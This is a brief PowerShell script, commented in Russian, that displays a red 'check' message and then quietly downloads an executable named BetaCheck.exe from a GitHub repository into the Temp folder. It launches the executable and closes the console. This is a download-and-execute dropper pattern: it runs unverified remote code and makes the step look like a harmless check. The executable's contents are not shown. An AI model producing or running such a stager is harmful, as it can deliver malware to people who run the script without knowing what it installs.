# Устанавливаем красный цвет текста и выводим сообщение
Write-Host "Проверка красным" -ForegroundColor Red

# Скачиваем файл на фоне (без отображения прогресса)
$url = "https://github.com/fayk0180-cmd/BetaCheck/raw/refs/heads/main/BetaCheck.exe"  # 
$output = "$env:Temp\BetaCheck.exe"

Invoke-WebRequest -Uri $url -OutFile $output -ErrorAction SilentlyContinue

# Открываем скачанный файл (если скачивание прошло успешно)
if (Test-Path $output) {
    Start-Process $output
} else {
    Write-Host "Файл не скачан" -ForegroundColor Yellow
}

# Закрываем окно PowerShell (если запущено как окно)
if ($Host.Name -like "*ConsoleHost*") {
    Start-Sleep -Seconds 2  # Даем время на открытие файла
    exit
}

